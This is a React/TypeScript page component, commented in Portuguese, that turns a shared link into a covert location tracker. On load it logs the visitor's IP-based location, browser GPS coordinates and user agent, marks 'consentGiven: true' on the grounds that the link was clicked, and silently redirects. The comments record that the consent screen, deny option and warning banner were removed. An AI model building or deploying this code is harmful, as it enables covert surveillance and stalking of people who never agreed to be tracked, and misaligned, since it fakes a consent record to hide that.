import React, { useState, useEffect } from 'react';
import { useParams } from 'react-router-dom';
import { AlertTriangle, CheckCircle, XCircle, FileText, WifiOff, Loader2 } from 'lucide-react';
import { getCaseById, addLogToCase } from '../services/storageService';
import { getIpData, getBrowserLocation } from '../services/geoService';
import { Button } from '../components/Button';
import { AccessLog } from '../types';
import { v4 as uuidv4 } from 'uuid';
import { db } from '../services/firebase';

export const TrackingView: React.FC = () => {
  const { id } = useParams<{ id: string }>();
  const [loading, setLoading] = useState(false);
  // Mantemos initialLoading para garantir que temos o URL de destino
  const [initialLoading, setInitialLoading] = useState(true); 
  const [error, setError] = useState('');
  const [caseData, setCaseData] = useState<any>(undefined);

  // 1. Função renomeada e levemente ajustada para ser chamada automaticamente
  const trackAndRedirect = async (data: any) => {
    if (!id || !data) return;
    setLoading(true);
    setError('');
    
    try {
      // 1. Get IP Data
      const ipData = await getIpData();
      
      // 2. Try to get GPS (Ainda tentará pedir a permissão do navegador)
      let gpsData = undefined;
      try {
        // O navegador ainda pode disparar a caixa de permissão de geolocalização aqui
        const position = await getBrowserLocation(); 
        gpsData = {
          latitude: position.coords.latitude,
          longitude: position.coords.longitude,
          accuracy: position.coords.accuracy
        };
      } catch (e) {
        console.log("GPS denied or unavailable");
      }

      // 3. Construct Log
      const log: AccessLog = {
        id: uuidv4(),
        timestamp: new Date().toISOString(),
        userAgent: navigator.userAgent,
        ip: ipData.ip,
        geoRaw: ipData,
        gps: gpsData,
        consentGiven: true // Consideramos consentimento por ter clicado no link
      };

      // 4. Save (Async now)
      await addLogToCase(id, log);

      // 5. Redirect or Finish
      if (data.destinationUrl) {
          let url = data.destinationUrl.trim();
          if (!/^https?:\/\//i.test(url)) {
              url = 'https://' + url;
          }
          window.location.href = url;
      } else {
          // Se não tiver URL de destino, apenas mostra a mensagem de sucesso
          window.location.href = '/sucesso-registro'; // Redireciona para evitar loop
      }

    } catch (err) {
      console.error(err);
      // Em caso de erro, ainda redireciona para não travar o usuário
      if (data.destinationUrl) {
        window.location.href = data.destinationUrl; 
      } else {
        setError('Erro de conexão, redirecionando...');
        window.location.href = 'https://google.com';
      }
    }
  };

  useEffect(() => {
    const load = async () => {
        if (id) {
            const data = await getCaseById(id);
            setCaseData(data);

            // 2. NOVO: Se encontramos os dados do caso, iniciamos o rastreamento e redirecionamento
            if (data) {
              await trackAndRedirect(data);
            }
        }
        setInitialLoading(false);
    }
    load();
  }, [id]);

  // REMOVIDOS: handleDeny, completed state e a tela de 'completed' (pois redireciona diretamente)
  // As telas de erro e carregamento inicial (loading) foram mantidas

  if (initialLoading || loading) {
      return (
        <div className="min-h-screen flex items-center justify-center bg-slate-100">
            <Loader2 className="animate-spin w-8 h-8 text-slate-400" />
        </div>
      )
  }

  if (!caseData) {
    return (
        <div className="min-h-screen flex items-center justify-center bg-slate-100 p-4 font-sans">
            <div className="bg-white p-6 rounded-lg shadow-lg text-center max-w-sm border border-slate-200">
                <WifiOff className="w-12 h-12 text-slate-400 mx-auto mb-3" />
                <h3 className="text-lg font-bold text-slate-700 mb-2">Procedimento Não Encontrado</h3>
                <p className="text-slate-500 text-sm mb-4">
                  O link é inválido ou o caso não existe neste banco de dados.
                </p>
                {!db && (
                    <div className="bg-yellow-50 p-3 rounded text-xs text-yellow-700 text-left border border-yellow-100">
                    <strong>Nota:</strong> O app está em modo Demo (Local). Para funcionar globalmente, configure as chaves do Firebase em <code>services/firebase.ts</code>.
                    </div>
                )}
            </div>
        </div>
    );
  }
  
  // Se houver erro, exibe a mensagem de erro (mantendo o tratamento original)
  if (error) {
    return (
        <div className="min-h-screen flex items-center justify-center bg-red-50 p-4 font-sans">
            <div className="bg-white p-6 rounded-lg shadow-lg text-center max-w-sm border border-red-200">
                <XCircle className="w-12 h-12 text-red-500 mx-auto mb-3" />
                <h3 className="text-lg font-bold text-slate-700 mb-2">Erro de Conexão</h3>
                <p className="text-slate-500 text-sm mb-4">
                    {error}
                </p>
                <Button onClick={() => window.location.reload()} variant="primary">
                    Tentar Novamente
                </Button>
            </div>
        </div>
    );
  }

  // REMOVIDO: O bloco de código final que continha o banner amarelo, o aviso e os botões.
  // O redirecionamento acontece antes de chegar aqui.
  // Se chegou aqui sem erro e sem redirecionar, é um cenário de falha inesperada, 
  // então retornamos a tela de carregamento para tentar novamente.
  return (
    <div className="min-h-screen flex items-center justify-center bg-slate-100">
        <h1 className="text-lg text-slate-500">Redirecionando...</h1>
        <Loader2 className="animate-spin w-8 h-8 text-slate-400 ml-2" />
    </div>
  );
};